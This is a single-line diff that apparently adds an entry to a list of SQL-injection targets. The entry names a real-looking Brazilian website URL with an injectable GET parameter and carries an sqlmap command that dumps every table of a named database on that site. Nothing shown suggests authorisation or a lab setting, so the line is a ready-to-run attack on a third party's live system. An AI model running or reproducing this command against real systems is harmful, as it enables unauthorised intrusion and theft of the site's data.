@@ -1,0 +1,1 @@
+https://www.coele.com.br/disciplinasperiodo.php?p=1 (GET)  # sqlmap.py -u https://www.coele.com.br/disciplinasperiodo.php?p=1 -D coelebr_simteel --dump-all
